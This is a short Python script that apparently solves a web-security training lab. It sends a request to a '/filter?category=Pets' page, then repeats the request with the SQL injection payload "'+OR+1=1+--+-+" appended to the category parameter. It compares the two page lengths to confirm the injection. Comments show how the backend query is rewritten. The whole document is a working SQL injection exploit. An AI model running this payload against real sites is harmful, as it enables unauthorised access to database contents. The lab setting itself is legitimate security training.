import requests
import sys

if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

#SQLi is in `category` parameter of `/filter` directory 
URL = sys.argv[1] + "/filter?category=Pets"

print(f"Requesting {URL}")
response = requests.get(URL) # Query becomes like : SELECT * FROM Products WHERE category = 'Pets';
print(f"Original Page length : {len(response.text)}")

#creating malicious URL
URL = URL + "'+OR+1=1+--+-+" #Query becomes like : SELECT * FROM Products WHERE category = 'Pets' OR 1=1 -- - 
print(f"Requesting {URL}")
response = requests.get(URL)
print(f"After SQLi, page length : {len(response.text)}") #Should be greater than the original query

print("SQLi Successfull!!") #Since the content length of both requests are different.
